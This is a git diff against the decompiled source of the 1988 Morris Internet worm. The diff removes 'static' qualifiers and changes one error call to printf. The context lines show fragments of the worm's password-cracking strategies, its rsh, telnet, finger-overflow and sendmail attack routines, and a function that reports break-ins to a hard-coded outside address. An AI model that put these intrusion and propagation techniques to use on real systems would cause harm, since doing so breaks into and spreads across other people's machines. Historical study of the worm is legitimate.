@@ -1,0 +1,227 @@
+diff --git a/cracksome.c b/cracksome.c
+index bea90f1..41d761a 100644
+--- a/cracksome.c
++++ b/cracksome.c
+@@ -136,7 +136,7 @@ strat_0()					/* 0x5da4 */
+ }
+ 
+ /* Check for 'username', 'usernameusername' and 'emanresu' as passwds. */
+-static strat_1()				/* 0x61ca */
++strat_1()				/* 0x61ca */
+ {
+     int cnt;
+     char usrname[50], buf[50];
+@@ -179,7 +179,7 @@ static strat_1()				/* 0x61ca */
+     return;
+ }
+ 
+-static reverse_str(str1, str2)			/* x642a */
++reverse_str(str1, str2)			/* x642a */
+      char *str1, *str2;
+ {
+     int length, i;
+@@ -192,7 +192,7 @@ static reverse_str(str1, str2)			/* x642a */
+     return;
+ }
+ 
+-static try_passwd(user, str)			/* 0x6484, unchecked */
++try_passwd(user, str)			/* 0x6484, unchecked */
+      struct usr *user;
+      char *str;
+ {
+@@ -210,7 +210,7 @@ static try_passwd(user, str)			/* 0x6484, unchecked */
+ /* Collect hostnames and run hueristic #1 for this user's .forward and .rhosts
+  */
+ /* This is only called from try_passwd() */
+-static attack_user(user)			/* 0x6514 */
++attack_user(user)			/* 0x6514 */
+      struct usr *user;
+ {
+     FILE *fwd_fp;
+@@ -378,7 +378,7 @@ char *wds[] = 					/* 0x21a74 */
+ int nextw = 0;					/* 0x24868 */
+ 
+ /* Try a list of potential passwds for each user. */
+-static try_words()				/* 0x66da */
++try_words()				/* 0x66da */
+ {
+     struct usr *user;
+     int i, j;
+@@ -407,7 +407,7 @@ static try_words()				/* 0x66da */
+ /* Called only from the cracksome() dispatch loop. Tries a single word from th
+ e
+  * dictionary, downcasing if capitalized and trying again. */
+-static dict_words()				/* 0x67f0 */
++dict_words()				/* 0x67f0 */
+ {
+     char buf[512];
+     struct usr *user;
+diff --git a/hs.c b/hs.c
+index df48886..250e9e0 100644
+--- a/hs.c
++++ b/hs.c
+@@ -162,7 +162,7 @@ hi_84(arg1)					/* 0x34ac */
+ }
+ 
+ /* Only called in the function above */
+-static command_port_p(addr, time)		/* x36d2, <hi+634> */
++command_port_p(addr, time)		/* x36d2, <hi+634> */
+      u_long addr;
+      int time;
+ {
+@@ -192,11 +192,11 @@ r... */
+     close(s);
+     
+     if (connection < 0 && errno == ENETUNREACH)
+-	error("Network unreachable");
++	printf("Network unreachable");
+     return connection != -1;
+ }
+ 
+-static try_telnet_p(addr)			/* x37b2 <hi+858>, checked */
++try_telnet_p(addr)			/* x37b2 <hi+858>, checked */
+      u_long addr;
+ {
+     int s, connection;					/* 28 */
+@@ -226,7 +226,7 @@ d */
+ }
+ 
+ /* Used in hg(), hi(), and hi_84(). */
+-static try_rsh_and_mail(host)				/* x3884, <hi+1068> */
++try_rsh_and_mail(host)				/* x3884, <hi+1068> */
+      struct hst *host;
+ {
+     int fd1, fd2, result;
+@@ -273,7 +273,7 @@ static try_rsh_and_mail(host)				/* x3884, <hi+1068> */
+ 
+ /* Check a2in() as it is updated */
+ /* Used in twice in try_rsh_and_mail(), once in hu1(). */
+-static talk_to_sh(host, fdrd, fdwr)		/* x3a20, Checked, changed <hi+
++talk_to_sh(host, fdrd, fdwr)		/* x3a20, Checked, changed <hi+
+ >*/
+      struct hst *host;
+      int fdrd, fdwr;
+@@ -509,14 +509,14 @@ static compile_slave(host, s, arg16, arg20, arg24) /* x431e, <waithit+1176> */
+     return send_text(s, buf);
+ }
+ 
+-static send_text(fd, str)			/* 0x44c0, <waithit+1594> */
++send_text(fd, str)			/* 0x44c0, <waithit+1594> */
+      char *str;
+ {
+     write(fd, str, strlen(str));
+ }
+ 
+ /* Used in try_rsh_and_mail(). */
+-static fork_rsh(host, fdp1, fdp2, str)		/* 0x44f4, <waithit+1646> */
++fork_rsh(host, fdp1, fdp2, str)		/* 0x44f4, <waithit+1646> */
+      char *host;
+      int *fdp1, *fdp2;
+      char *str;
+@@ -576,7 +576,7 @@ static fork_rsh(host, fdp1, fdp2, str)		/* 0x44f4, <waithit+1646> */
+     return 0;
+ }
+ 
+-static test_connection(rdfd, wrfd, time)			/* x476c,<waith
++test_connection(rdfd, wrfd, time)			/* x476c,<waith
+ it+2278> */
+      int rdfd, wrfd, time;
+ {
+@@ -588,7 +588,7 @@ it+2278> */
+     return wait_for(rdfd, numbuf, time);
+ }
+ 
+-static wait_for(fd, str, time)			/* <waithit+2412> */
++wait_for(fd, str, time)			/* <waithit+2412> */
+      int fd, time;
+      char *str;
+ {
+@@ -613,7 +613,7 @@ justreturn(sig, code, scp)					/* 0x4872 */
+     alarmed = 1;
+ }
+ 
+-static x488e(fd, buf, num_chars, maxtime)
++x488e(fd, buf, num_chars, maxtime)
+      int fd, num_chars, maxtime;
+      char *buf;
+ {	
+@@ -698,7 +698,7 @@ to dump core.
+  * PC, to point into the middle of the string sent over.  The instructions
+  * in the string do the direct system call version of execve("/bin/sh"). */
+ 
+-static try_finger(host, fd1, fd2)		/* 0x49ec,<just_return+378 */
++try_finger(host, fd1, fd2)		/* 0x49ec,<just_return+378 */
+      struct hst *host;
+      int *fd1, *fd2;
+ {
+@@ -803,7 +803,7 @@ permute(ptr, num, size)			/* 0x4c9a */
+ 
+ 
+ /* Called from try_rsh_and_mail() */
+-static try_mail(host)				/* x4d3c <permute+162>*/
++try_mail(host)				/* x4d3c <permute+162>*/
+      struct hst *host;
+ {
+     int i, l8, l12, l16, s;
+@@ -893,7 +893,7 @@ static try_mail(host)				/* x4d3c <permute+162>*/
+ 
+ /* Used only in try_mail() above.  This fills buffer with a line of the respon
+ se */
+-static x50bc(s, buffer)				/* x50bc, <permute+1058
++x50bc(s, buffer)				/* x50bc, <permute+1058
+ > */
+      int s;					/* socket */
+      char *buffer;
+@@ -967,7 +967,7 @@ hu1(alt_username, host, username2)		/* x5178 */
+ /* It goes through the six connections in host trying to connect to the
+  * remote execution server on each one.
+  */
+-static int x538e(host, name1, name2)
++int x538e(host, name1, name2)
+      struct hst *host;
+      char *name1, *name2;
+ {
+@@ -1205,7 +1205,7 @@ other_sleep(how_long)				/* 0x5a38 */
+     return;
+ }
+ 
+-static answer_other()				/* 0x5b14 */
++answer_other()				/* 0x5b14 */
+ {
+     int ns, addrlen, magic_holder, magic1, magic2;
+     struct sockaddr_in sin;			/* 16 bytes */
+diff --git a/net.c b/net.c
+index 8910390..bf40f46 100644
+--- a/net.c
++++ b/net.c
+@@ -90,7 +90,7 @@ rt_init()					/* 0x2a26 */
+     return 1;
+ }						/* 540 */
+ 
+-static rt_init_plus_544()				/* 0x2c44 */
++rt_init_plus_544()				/* 0x2c44 */
+ {
+ }
+ 
+diff --git a/worm.c b/worm.c
+index d4da983..f255101 100644
+--- a/worm.c
++++ b/worm.c
+@@ -84,7 +84,7 @@ main(argc, argv)		/* 0x20a0 */
+     mainloop();
+ }
+ 
+-static mainloop()				/* 0x2302 */
++mainloop()				/* 0x2302 */
+ {
+     long key, time1, time0;
+     
+@@ -140,7 +140,7 @@ char *XS(str1)			/* 0x23fc */
+ /* This report a sucessful breakin by sending a single byte to "128.32.137.13"
+  * (whoever that is). */
+ 
+-static report_breakin(arg1, arg2)		/* 0x2494 */
++report_breakin(arg1, arg2)		/* 0x2494 */
+ {
+     int s;
+     struct sockaddr_in sin;
